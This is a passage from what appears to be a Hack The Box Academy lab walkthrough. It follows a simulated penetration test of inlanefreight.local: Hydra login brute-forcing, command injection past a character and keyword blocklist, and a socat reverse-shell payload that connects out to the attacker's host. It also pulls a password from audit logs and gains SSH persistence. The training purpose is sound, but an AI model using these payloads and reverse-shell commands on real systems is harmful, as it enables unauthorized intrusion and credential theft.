Hydra v9.1 (c) 2020 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">use</span> <span class="hljs-keyword">in</span> military <span class="hljs-keyword">or</span> secret service organizations, <span class="hljs-keyword">or</span> <span class="hljs-keyword">for</span> illegal purposes (this <span class="hljs-keyword">is</span> non-binding, these *** <span class="hljs-keyword">ignore</span> laws <span class="hljs-keyword">and</span> ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) <span class="hljs-keyword">starting</span> <span class="hljs-keyword">at</span> <span class="hljs-number">2022</span><span class="hljs-number">-06</span><span class="hljs-number">-21</span> <span class="hljs-number">11</span>:<span class="hljs-number">32</span>:<span class="hljs-number">17</span>
[<span class="hljs-keyword">DATA</span>] <span class="hljs-keyword">max</span> <span class="hljs-number">16</span> tasks per <span class="hljs-number">1</span> <span class="hljs-keyword">server</span>, overall <span class="hljs-number">16</span> tasks, <span class="hljs-number">99</span> login tries (l:<span class="hljs-number">1</span>/p:<span class="hljs-number">99</span>), ~<span class="hljs-number">7</span> tries per task
[<span class="hljs-keyword">DATA</span>] attacking <span class="hljs-keyword">http</span>-post-<span class="hljs-keyword">form</span>://monitoring.inlanefreight.local:<span class="hljs-number">80</span>/login.php:username=<span class="hljs-keyword">admin</span>&amp;<span class="hljs-keyword">password</span>=^PASS^:Invalid Credentials!
[<span class="hljs-number">80</span>][<span class="hljs-keyword">http</span>-post-<span class="hljs-keyword">form</span>] host: monitoring.inlanefreight.local   login: <span class="hljs-keyword">admin</span>   <span class="hljs-keyword">password</span>: <span class="hljs-number">12</span>qwaszx
<span class="hljs-number">1</span> <span class="hljs-keyword">of</span> <span class="hljs-number">1</span> target successfully completed, <span class="hljs-number">1</span> valid <span class="hljs-keyword">password</span> <span class="hljs-keyword">found</span>
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished <span class="hljs-keyword">at</span> <span class="hljs-number">2022</span><span class="hljs-number">-06</span><span class="hljs-number">-21</span> <span class="hljs-number">11</span>:<span class="hljs-number">32</span>:<span class="hljs-number">22</span>
</code></pre>
<p>Once logged in, we are presented with some sort of monitoring console. If we type <code>help</code>, we are presented with a list of commands. This seems like a restricted shell environment to perform limited tasks and something very dangerous that should not be exposed externally. The last class of vulnerabilities taught in the <code>Penetration Tester Job Role Path</code> that we have not yet covered is <a href="https://academy.hackthebox.com/module/details/109">Command Injections</a>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/monitoring.png" alt="text"></p>
<p>We walk through each of the commands. Trying <code>cat /etc/passwd</code> does not work, so it does appear that we are indeed in a restricted environment. <code>whoami</code> and <code>date</code> provide us with some basic information. We don&#39;t want to <code>reboot</code> the target and cause a service disruption. We are unable to <code>cd</code> to other directories. Typing <code>ls</code> shows us a few files that are likely stored in the directory that we are currently restricted to.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/monitoring\_files.png" alt="text"></p>
<p>Looking through the files, we find an authentication service and also that we are inside a container. The last option in the list is <code>connection_test</code>. Typing that in yields a <code>Success</code> message and nothing more. Going back over to Burp Suite and proxying the request, we see that a <code>GET</code> request is made to <code>/ping.php</code> for the localhost IP <code>127.0.0.1</code>, and the HTTP response shows a single successful ping attack. We can infer that the <code>/ping.php</code> script is running an operating command using a PHP function such as <code>shell_exec(ping -c 1 127.0.0.1)</code> or perhaps similar using the <a href="https://www.php.net/manual/en/function.system.php">system()</a> function to execute a command. If this script is coded improperly, it could easily result in a command injection vulnerability, so let&#39;s try some common payloads.</p>
<p>There seems to be some sort of filtering in place because trying standard payloads like <code>GET /ping.php?ip=%127.0.0.1;id</code> and <code>GET /ping.php?ip=%127.0.0.1|id</code> result in an <code>Invalid input</code> error, meaning there is probably a character blacklist in play. We can bypass this filter by using a line feed character <code>%0A</code> (or new-line character) as our injection operator following the methodology discussed in the <a href="https://academy.hackthebox.com/module/109/section/1036">Bypassing Space Filters</a> section. We can make a request appending the new-line character like so <code>GET /ping.php?ip=127.0.0.1%0a</code>, and the ping is still successful, meaning the character is not blacklisted.</p>
<p>We&#39;ve won the first battle, but there seems to be another type of filter in place, as trying something like <code>GET /ping.php?ip=127.0.0.1%0aid</code> still results in an <code>Invalid input</code> error. Next, we can play around with the command syntax and see that we can bypass the second filter using single quotes. Switching to <code>cURL</code>, we can run the <code>id</code> command as follows:</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl <span class="hljs-string">"http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'd"</span>

PING <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> (<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>) <span class="hljs-number">56</span>(<span class="hljs-number">84</span>) <span class="hljs-keyword">bytes</span> <span class="hljs-keyword">of</span> data.
<span class="hljs-number">64</span> <span class="hljs-keyword">bytes</span> <span class="hljs-built_in">from</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>: icmp_seq=<span class="hljs-number">1</span> ttl=<span class="hljs-number">64</span> <span class="hljs-built_in">time</span>=<span class="hljs-number">0.045</span> ms

<span class="hljs-comment">--- 127.0.0.1 ping statistics ---</span>
<span class="hljs-number">1</span> packets transmitted, <span class="hljs-number">1</span> received, <span class="hljs-number">0</span>% packet loss, <span class="hljs-built_in">time</span> <span class="hljs-number">0</span>ms
rtt <span class="hljs-built_in">min</span>/<span class="hljs-built_in">avg</span>/<span class="hljs-built_in">max</span>/mdev = <span class="hljs-number">0.045</span>/<span class="hljs-number">0.045</span>/<span class="hljs-number">0.045</span>/<span class="hljs-number">0.000</span> ms
uid=<span class="hljs-number">1004</span>(webdev) gid=<span class="hljs-number">1004</span>(webdev) groups=<span class="hljs-number">1004</span>(webdev),<span class="hljs-number">4</span>(adm)
</code></pre>
<p>We have achieved command execution as the <code>webdev</code> user. Digging around a bit more, we see that this host has multiple IP addresses, one of which places it inside the <code>172.16.8.0/23</code> network that was part of the initial scope. If we can gain stable access to this host, we may be able to pivot into the internal network and start attacking the Active Directory domain.</p>
<p>Web Enumeration &amp; Exploitation</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl <span class="hljs-string">"http://monitoring.inlanefreight.local/ping.php?ip=127.0.0.1%0a'i'fconfig"</span>

PING <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span> (<span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>) <span class="hljs-number">56</span>(<span class="hljs-number">84</span>) bytes of data.
<span class="hljs-number">64</span> bytes from <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span>: icmp_seq=<span class="hljs-number">1</span> ttl=<span class="hljs-number">64</span> time=<span class="hljs-number">0.048</span> ms

--- <span class="hljs-number">127.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.1</span> ping statistics ---
<span class="hljs-number">1</span> packets transmitted, <span class="hljs-number">1</span> received, <span class="hljs-number">0</span>% packet loss, time 0ms
rtt min/avg/max/mdev = <span class="hljs-number">0.048</span>/<span class="hljs-number">0.048</span>/<span class="hljs-number">0.048</span>/<span class="hljs-number">0.000</span> ms

&lt;SNIP&gt;
<span class="hljs-symbol">
ens160:</span> flags=<span class="hljs-number">4163</span>&lt;<span class="hljs-meta">UP</span>,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="hljs-number">1500</span>
        inet <span class="hljs-number">10.129</span><span class="hljs-meta">.203</span><span class="hljs-meta">.101</span>  netmask <span class="hljs-number">255.255</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>  broadcast <span class="hljs-number">10.129</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>
        inet6 dead:beef::<span class="hljs-number">250</span>:56ff:feb9:67a5  prefixlen <span class="hljs-number">64</span>  scopeid <span class="hljs-number">0x0</span>&lt;<span class="hljs-meta">global</span>&gt;
        inet6 fe80::<span class="hljs-number">250</span>:56ff:feb9:67a5  prefixlen <span class="hljs-number">64</span>  scopeid <span class="hljs-number">0x20</span>&lt;link&gt;
        ether <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:b9:<span class="hljs-number">67</span>:a5  txqueuelen <span class="hljs-number">1000</span>  (Ethernet)
        RX packets <span class="hljs-number">10055</span>  bytes <span class="hljs-number">1041358</span> (<span class="hljs-number">1.0</span> MB)
        RX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span>
        TX packets <span class="hljs-number">2316</span>  bytes <span class="hljs-number">4030180</span> (<span class="hljs-number">4.0</span> MB)
        TX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span>
<span class="hljs-symbol">
ens192:</span> flags=<span class="hljs-number">4163</span>&lt;<span class="hljs-meta">UP</span>,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="hljs-number">1500</span>
        inet <span class="hljs-number">172.16</span><span class="hljs-meta">.8</span><span class="hljs-meta">.120</span>  netmask <span class="hljs-number">255.255</span><span class="hljs-meta">.254</span><span class="hljs-meta">.0</span>  broadcast <span class="hljs-number">172.16</span><span class="hljs-meta">.255</span><span class="hljs-meta">.255</span>
        inet6 fe80::<span class="hljs-number">250</span>:56ff:feb9:a62d  prefixlen <span class="hljs-number">64</span>  scopeid <span class="hljs-number">0x20</span>&lt;link&gt;
        ether <span class="hljs-number">00</span>:<span class="hljs-number">50</span>:<span class="hljs-number">56</span>:b9:a6:<span class="hljs-number">2d</span>  txqueuelen <span class="hljs-number">1000</span>  (Ethernet)
        RX packets <span class="hljs-number">21515</span>  bytes <span class="hljs-number">1890242</span> (<span class="hljs-number">1.8</span> MB)
        RX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span>  overruns <span class="hljs-number">0</span>  frame <span class="hljs-number">0</span>
        TX packets <span class="hljs-number">15</span>  bytes <span class="hljs-number">1146</span> (<span class="hljs-number">1.1</span> KB)
        TX errors <span class="hljs-number">0</span>  dropped <span class="hljs-number">0</span> overruns <span class="hljs-number">0</span>  carrier <span class="hljs-number">0</span>  collisions <span class="hljs-number">0</span>
</code></pre>
<p>Our next challenge is finding a way to a reverse shell. We can run single commands, but anything with a space does not work. Back to the <a href="https://academy.hackthebox.com/module/109/section/1036">Bypassing Space Filters</a> section of the <code>Command Injections</code> module, we remember that we can use the <code>($IFS) Linux Environment Variable</code> to bypass space restrictions. We can combine this with the new-line character bypass and start enumerating ways to obtain a reverse shell. To aid us, let&#39;s take a look at the <code>ping.php</code> file to get an understanding of what is being filtered so we can limit the amount of guesswork needed.</p>
<p>Switching back to Burp and making the request <code>GET /ping.php?ip=127.0.0.1%0a&#39;c&#39;at${IFS}ping.php</code>, or similar, gives us the file contents, and we can work on beating the filter and finding a way to establish a reverse shell.</p>
<p>Code: php</p>
<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span>
ini_set(<span class="hljs-string">'display_errors'</span>, <span class="hljs-number">1</span>);
ini_set(<span class="hljs-string">'display_startup_errors'</span>, <span class="hljs-number">1</span>);
error_reporting(E_ALL);
$output = <span class="hljs-string">''</span>;

<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span><span class="hljs-params">($str)</span>
</span>{
  $operators = [<span class="hljs-string">'&amp;'</span>, <span class="hljs-string">'|'</span>, <span class="hljs-string">';'</span>, <span class="hljs-string">'\\'</span>, <span class="hljs-string">'/'</span>, <span class="hljs-string">' '</span>];
  <span class="hljs-keyword">foreach</span> ($operators <span class="hljs-keyword">as</span> $operator) {
    <span class="hljs-keyword">if</span> (strpos($str, $operator)) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
    }
  }
  $words = [<span class="hljs-string">'whoami'</span>, <span class="hljs-string">'echo'</span>, <span class="hljs-string">'rm'</span>, <span class="hljs-string">'mv'</span>, <span class="hljs-string">'cp'</span>, <span class="hljs-string">'id'</span>, <span class="hljs-string">'curl'</span>, <span class="hljs-string">'wget'</span>, <span class="hljs-string">'cd'</span>, <span class="hljs-string">'sudo'</span>, <span class="hljs-string">'mkdir'</span>, <span class="hljs-string">'man'</span>, <span class="hljs-string">'history'</span>, <span class="hljs-string">'ln'</span>, <span class="hljs-string">'grep'</span>, <span class="hljs-string">'pwd'</span>, <span class="hljs-string">'file'</span>, <span class="hljs-string">'find'</span>, <span class="hljs-string">'kill'</span>, <span class="hljs-string">'ps'</span>, <span class="hljs-string">'uname'</span>, <span class="hljs-string">'hostname'</span>, <span class="hljs-string">'date'</span>, <span class="hljs-string">'uptime'</span>, <span class="hljs-string">'lsof'</span>, <span class="hljs-string">'ifconfig'</span>, <span class="hljs-string">'ipconfig'</span>, <span class="hljs-string">'ip'</span>, <span class="hljs-string">'tail'</span>, <span class="hljs-string">'netstat'</span>, <span class="hljs-string">'tar'</span>, <span class="hljs-string">'apt'</span>, <span class="hljs-string">'ssh'</span>, <span class="hljs-string">'scp'</span>, <span class="hljs-string">'less'</span>, <span class="hljs-string">'more'</span>, <span class="hljs-string">'awk'</span>, <span class="hljs-string">'head'</span>, <span class="hljs-string">'sed'</span>, <span class="hljs-string">'nc'</span>, <span class="hljs-string">'netcat'</span>];
  <span class="hljs-keyword">foreach</span> ($words <span class="hljs-keyword">as</span> $word) {
    <span class="hljs-keyword">if</span> (strpos($str, $word) !== <span class="hljs-keyword">false</span>) {
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">true</span>;
    }
  }

  <span class="hljs-keyword">return</span> <span class="hljs-keyword">false</span>;
}

<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'ip'</span>])) {
  $ip = $_GET[<span class="hljs-string">'ip'</span>];
  <span class="hljs-keyword">if</span> (filter($ip)) {
    $output = <span class="hljs-string">"Invalid input"</span>;
  } <span class="hljs-keyword">else</span> {
    $cmd = <span class="hljs-string">"bash -c 'ping -c 1 "</span> . $ip . <span class="hljs-string">"'"</span>;
    $output = shell_exec($cmd);
  }
}
<span class="hljs-meta">?&gt;</span></span>
<span class="php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-keyword">echo</span> $output;
<span class="hljs-meta">?&gt;</span></span>
</code></pre>
<p>We can see that the majority of options for getting a reverse shell are filtered which will make things difficult, however one that is not is <code>socat</code>. Socat is a versatile tool that can be used for catching shells, and even pivoting as we have seen in the <a href="https://academy.hackthebox.com/module/details/158">Pivoting, Tunneling, and Port Forwarding</a> module. Let&#39;s check and see if it&#39;s available to us on the system. Heading back to Burp and using the request <code>GET /ping.php?ip=127.0.0.1%0a&#39;w&#39;h&#39;i&#39;ch${IFS}socat</code> shows us that it is on the system, located at <code>/usr/bin/socat</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/163/socat\_check.png" alt="text"></p>
<hr>
<h3 id="next-steps">Next Steps</h3>
<p>Now that we&#39;ve finally worked our way through all of the externally-facing services and web applications, we have a good idea as to our next steps. In the next section, we will work on establishing a reverse shell into the internal environment and escalating our privileges to establish some sort of persistence on the target host.</p>
<h2 id="initial-access">Initial Access</h2>
<hr>
<p>Now that we&#39;ve thoroughly enumerated and attacked the external perimeter and uncovered a wealth of findings, we&#39;re ready to shift gears and focus on obtaining stable internal network access. Per the SoW document, if we can achieve an internal foothold, the client would like us to see how far we can go up to and including gaining <code>Domain Admin level access</code>. In the last section, we worked hard on peeling apart the layers and finding web apps that led to early file read or remote code execution but didn&#39;t get us into the internal network. We left off with obtaining RCE on the <code>monitoring.inlanefreight.local</code> application after a hard-fought battle against filters and blacklists set in place to try to prevent <code>Command Injection</code> attacks.</p>
<hr>
<h3 id="getting-a-reverse-shell">Getting a Reverse Shell</h3>
<p>As mentioned in the previous section, we can use <a href="https://linux.die.net/man/1/socat">Socat</a> to establish a reverse shell connection. Our base command will be as follows, but we&#39;ll need to tweak it some to get past the filtering:</p>
<p>Initial Access</p>
<pre><code class="lang-shell-session">socat <span class="hljs-string">TCP4:</span><span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.5</span>:<span class="hljs-number">8443</span> <span class="hljs-string">EXEC:</span><span class="hljs-regexp">/bin/</span>bash
</code></pre>
<p>We can modify this command to give us a payload to catch a reverse shell.</p>
<p>Initial Access</p>
<pre><code class="lang-shell-session"><span class="hljs-keyword">GET</span> <span class="hljs-string">/ping.php?ip=127.0.0.1%0a's'o'c'a't'${IFS}TCP4:10.10.14.15:8443${IFS}EXEC:bash</span> HTTP/1.1
<span class="hljs-attribute">Host</span>: monitoring.inlanefreight.local
<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.74 Safari/537.36
<span class="hljs-attribute">Content-Type</span>: application/json
<span class="hljs-attribute">Accept</span>: */*
<span class="hljs-attribute">Referer</span>: http://monitoring.inlanefreight.local/index.php
<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.9
<span class="hljs-attribute">Cookie</span>: PHPSESSID=ntpou9fdf13i90mju7lcrp3f06
<span class="hljs-attribute">Connection</span>: close
</code></pre>
<p>Start a <code>Netcat</code> listener on the port used in the Socat command (8443 here) and execute the above request in Burp Repeater. If all goes as intended, we will have a reverse shell as the <code>webdev</code> user.</p>
<p>Initial Access</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -nvlp <span class="hljs-number">8443</span>

listening on [any] <span class="hljs-number">8443</span> ...
connect to [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.15</span>] from (UNKNOWN) [<span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.111</span>] <span class="hljs-number">51496</span>
id
uid=<span class="hljs-number">1004</span>(webdev) gid=<span class="hljs-number">1004</span>(webdev) groups=<span class="hljs-number">1004</span>(webdev),<span class="hljs-number">4</span>(adm)
</code></pre>
<p>Next, we&#39;ll need to upgrade to an <code>interactive TTY</code>. This <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">post</a> describes a few methods. We could use a method that was also covered in the <a href="https://academy.hackthebox.com/module/77/section/725">Types of Shells</a> section of the <code>Getting Started</code> module, executing the well-known Python one-liner (<code>python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code>) to spawn a psuedo-terminal. But we&#39;re going to try something a bit different using <code>Socat</code>. The reason for doing this is to get a proper terminal so we can run commands like <code>su</code>, <code>sudo</code>, <code>ssh</code>, <code>use command completion</code>, and <code>open a text editor if needed</code>.</p>
<p>We&#39;ll start a Socat listener on our attack host.</p>
<p>Initial Access</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ socat <span class="hljs-string">file:</span>`tty`,raw,echo=<span class="hljs-number">0</span> tcp-<span class="hljs-string">listen:</span><span class="hljs-number">4443</span>
</code></pre>
<p>Next, we&#39;ll execute a Socat one-liner on the target host.</p>
<p>Initial Access</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ nc -lnvp <span class="hljs-number">8443</span>

listening <span class="hljs-keyword">on</span> [<span class="hljs-title">any</span>] <span class="hljs-title">8443</span> ...
connect <span class="hljs-built_in">to</span> [<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.15</span>] <span class="hljs-built_in">from</span> (UNKNOWN) [<span class="hljs-number">10.129</span><span class="hljs-number">.203</span><span class="hljs-number">.111</span>] <span class="hljs-number">52174</span>
socat exec:<span class="hljs-string">'bash -li'</span>,pty,<span class="hljs-keyword">stderr</span>,setsid,sigint,sane tcp:<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.15</span>:<span class="hljs-number">4443</span>
</code></pre>
<p>If all goes as planned, we&#39;ll have a stable reverse shell connection on our Socat listener.</p>
<p>Initial Access</p>
<pre><code class="lang-shell-session">webdev<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:/var/www/html/monitoring</span><span class="hljs-variable">$ </span>id

uid=<span class="hljs-number">1004</span>(webdev) gid=<span class="hljs-number">1004</span>(webdev) groups=<span class="hljs-number">1004</span>(webdev),<span class="hljs-number">4</span>(adm)
webdev<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:/var/www/html/monitoring</span>$
</code></pre>
<p>Now that we&#39;ve got a stable reverse shell, we can start digging around the file system. The results of the <code>id</code> command are immediately interesting. The <a href="https://academy.hackthebox.com/module/51/section/477">Privileged Groups</a> section of the <code>Linux Privilege Escalation</code> module shows an example of users in the <code>adm</code> group having rights to read ALL logs stored in <code>/var/log</code>. Perhaps we can find something interesting there. We can use <a href="https://linux.die.net/man/8/aureport">aureport</a> to read audit logs on Linux systems, with the man page describing it as &quot;aureport is a tool that produces summary reports of the audit system logs.&quot;</p>
<p>Initial Access</p>
<pre><code class="lang-shell-session">webdev@dmz01:/var/www/html/monitoring$ aureport --tty | less

Error opening config file (Permission denied)
NOTE - using built-in logs: /var/log/audit/audit.log
<span class="hljs-symbol">WARNING: </span>terminal is not fully functional
<span class="hljs-bullet">-  </span>(press RETURN)
<span class="hljs-section">TTY Report
===============================================</span>
<span class="hljs-section"># date time event auid term sess comm data
===============================================</span>
1. 06/01/22 07:12:53 349 1004 ? 4 sh "bash",&lt;nl&gt;
2. 06/01/22 07:13:14 350 1004 ? 4 su "ILFreightnixadm!",&lt;nl&gt;
3. 06/01/22 07:13:16 355 1004 ? 4 sh "sudo su srvadm",&lt;nl&gt;
4. 06/01/22 07:13:28 356 1004 ? 4 sudo "ILFreightnixadm!"
5. 06/01/22 07:13:28 360 1004 ? 4 sudo &lt;nl&gt;
6. 06/01/22 07:13:28 361 1004 ? 4 sh "exit",&lt;nl&gt;
7. 06/01/22 07:13:36 364 1004 ? 4 bash "su srvadm",&lt;ret&gt;,"exit",&lt;ret&gt;
</code></pre>
<p>After running the command, type <code>q</code> to return to our shell. From the above output, it looks like a user was trying to authenticate as the <code>srvadm</code> user, and we have a potential credential pair <code>srvadm:ILFreightnixadm!</code>. Using the <code>su</code> command, we can authenticate as the <code>srvadm</code> user.</p>
<p>Initial Access</p>
<pre><code class="lang-shell-session">webdev<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:/var/www/html/monitoring</span><span class="hljs-variable">$ </span>su srvadm

<span class="hljs-symbol">Password:</span> 
<span class="hljs-variable">$ </span>id

uid=<span class="hljs-number">1003</span>(srvadm) gid=<span class="hljs-number">1003</span>(srvadm) groups=<span class="hljs-number">1003</span>(srvadm)
<span class="hljs-variable">$ </span>/bin/bash -i

srvadm<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:/var/www/html/monitoring</span>$
</code></pre>
<p>Now that we&#39;ve bypassed heavy filtering to achieve command injection, turned that code execution into a reverse shell, and escalated our privileges to another user, we don&#39;t want to lose access to this host. In the next section, we&#39;ll work towards achieving persistence, ideally after escalating privileges to <code>root</code>.</p>
<h2 id="post-exploitation-persistence">Post-Exploitation Persistence</h2>
<hr>
<p>Now that we&#39;ve worked so hard to obtain this foothold, we don&#39;t want to lose it. The goal is to use this host as a pivot point to access the rest of the internal network. Our shell is still relatively unstable, and we don&#39;t want to keep setting up our access with multiple steps because we want to be as efficient as possible and spend as much time on the actual assessment, not fiddling around with shells.</p>
<hr>
<h3 id="sinking-our-hooks-in">Sinking Our Hooks In</h3>
<p>Now that we have credentials (<code>srvadm:ILFreightnixadm!</code>), we can leverage the SSH port we saw open earlier and connect in for a stable connection. This is important because we want to be able to get back as close as possible to the same spot at the start of testing each day, so we don&#39;t have to waste time on setup. Now we won&#39;t always have SSH open to the internet and may have to achieve persistence another way. We could create a reverse shell binary on the host, execute it via the command injection, get a reverse shell or Meterpreter shell, and then work through that. Since SSH is here, we&#39;ll use it. There are many ways to pivot and tunnel our traffic which were covered in-depth in the <a href="https://academy.hackthebox.com/module/details/158">Pivoting, Tunneling, and Port Forwarding</a> module, so it&#39;s worth trying out some of them in this section to get extra practice. We will need to use some of these as we go deeper into this network. It&#39;s also good to have a backup way to get back in when using someone&#39;s credentials, as they may notice that their account is compromised or just hit that time of the month when they are prompted to change their password, and we won&#39;t be able to connect back in the next day. We should always be thinking ahead, analyzing every angle, and trying to anticipate issues before they arise. A lab is much different from the real world, and there are no resets or do-overs, so we need to work meticulously and maintain situational awareness as best as possible.</p>
<p>Post-Exploitation Persistence</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ ssh srvadm@<span class="hljs-number">10.129</span>.<span class="hljs-number">203.111</span>

The authenticity <span class="hljs-keyword">of</span> host <span class="hljs-string">'10.129.203.111 (10.129.203.111)'</span> can<span class="hljs-string">'t be established.
ECDSA key fingerprint is SHA256:3I77Le3AqCEUd+1LBAraYTRTF74wwJZJiYcnwfF5yAs.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '</span><span class="hljs-number">10.129</span>.<span class="hljs-number">203.111</span><span class="hljs-string">' (ECDSA) to the list of known hosts.
srvadm@10.129.203.111'</span>s password: 
Welcome <span class="hljs-keyword">to</span> Ubuntu <span class="hljs-number">20.04</span>.<span class="hljs-number">3</span> LTS (GNU/Linux <span class="hljs-number">5.4</span>.<span class="hljs-number">0</span>-<span class="hljs-number">113</span>-<span class="hljs-keyword">generic</span> x86_64)

* Documentation:  https:<span class="hljs-comment">//help.ubuntu.com</span>
* Management:     https:<span class="hljs-comment">//landscape.canonical.com</span>
* Support:        https:<span class="hljs-comment">//ubuntu.com/advantage</span>

 System information <span class="hljs-keyword">as</span> <span class="hljs-keyword">of</span> Tue <span class="hljs-number">21</span> Jun <span class="hljs-number">2022</span> <span class="hljs-number">07</span>:<span class="hljs-number">30</span>:<span class="hljs-number">27</span> PM UTC

 System load:                      <span class="hljs-number">0.31</span>
 Usage <span class="hljs-keyword">of</span> /:                       <span class="hljs-number">95.8</span>% <span class="hljs-keyword">of</span> <span class="hljs-number">13.72</span>GB
 Memory usage:                     <span class="hljs-number">64</span>%
 Swap usage:                       <span class="hljs-number">0</span>%
 Processes:                        <span class="hljs-number">458</span>
 Users logged <span class="hljs-keyword">in</span>:                  <span class="hljs-number">0</span>
 IPv4 address <span class="hljs-keyword">for</span> br-<span class="hljs-number">65</span>c448355ed2: <span class="hljs-number">172.18</span>.<span class="hljs-number">0.1</span>
 IPv4 address <span class="hljs-keyword">for</span> docker0:         <span class="hljs-number">172.17</span>.<span class="hljs-number">0.1</span>
 IPv4 address <span class="hljs-keyword">for</span> ens160:          <span class="hljs-number">10.129</span>.<span class="hljs-number">203.111</span>
 IPv6 address <span class="hljs-keyword">for</span> ens160:          dead:beef::<span class="hljs-number">250</span>:<span class="hljs-number">56</span>ff:feb9:d30d
 IPv4 address <span class="hljs-keyword">for</span> ens192:          <span class="hljs-number">172.16</span>.<span class="hljs-number">8.120</span>

 =&gt; / <span class="hljs-keyword">is</span> using <span class="hljs-number">95.8</span>% <span class="hljs-keyword">of</span> <span class="hljs-number">13.72</span>GB

* Super-optimized <span class="hljs-keyword">for</span> small spaces - <span class="hljs-keyword">read</span> how we shrank the memory
  footprint <span class="hljs-keyword">of</span> MicroK8s <span class="hljs-keyword">to</span> make it the smallest full K8s around.

  https:<span class="hljs-comment">//ubuntu.com/blog/microk8s-memory-optimisation</span>

<span class="hljs-number">97</span> updates can be applied immediately.
<span class="hljs-number">30</span> <span class="hljs-keyword">of</span> these updates are standard security updates.
<span class="hljs-keyword">To</span> see these additional updates run: apt list --upgradable


Last login: Wed Jun  <span class="hljs-number">1</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span>:<span class="hljs-number">59</span> <span class="hljs-number">2022</span> from <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
$ /bin/bash -i
srvadm@dmz01:~
</code></pre>
<p>Now that we have a stable connection via SSH, we can start enumerating further.</p>
<hr>
<h3 id="local-privilege-escalation">Local Privilege Escalation</h3>
<p>We could upload an enumeration script to the system such as <a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">LinPEAS</a>, but I always try two simple commands after gaining access: <code>id</code> to see if the compromised account is in any privileged local groups, and <code>sudo -l</code> to see if the account has any type of <code>sudo</code> privileges to run commands as another user or as root. By now, we have practiced many privilege escalation techniques in both Academy modules and perhaps some boxes on the HTB main platform. It&#39;s great to have these techniques in our back pocket, especially if we land on a very hardened system. However, we are dealing with human administrators, and humans make mistakes and also go for convenience. More often than not, my path to escalating privileges on a Linux box during a pentest was not some wildcard attack leveraging tar and a cron job, but rather something simple such as <code>sudo su</code> without a password to gain root privileges or not having to escalate privileges because the service I exploited was running in the context of the root account. It&#39;s still necessary to understand and practice as many techniques as possible because, as said a few times now, every environment is different, and we want to have the most comprehensive toolkit possible at our disposal.</p>
<p>Post-Exploitation Persistence</p>
<pre><code class="lang-shell-session">srvadm<span class="hljs-variable">@dmz01</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>sudo -l

Matching Defaults entries <span class="hljs-keyword">for</span> srvadm on <span class="hljs-symbol">dmz01:</span>
  env_reset, mail_badpass,
  secure_path=<span class="hljs-regexp">/usr/local</span><span class="hljs-regexp">/sbin\:/usr</span><span class="hljs-regexp">/local/bin</span>\<span class="hljs-symbol">:/usr/sbin</span>\<span class="hljs-symbol">:/usr/bin</span>\<span class="hljs-symbol">:/sbin</span>\<span class="hljs-symbol">:/bin</span>\<span class="hljs-symbol">:/snap/bin</span>

User srvadm may run the following commands on <span class="hljs-symbol">dmz01:</span>
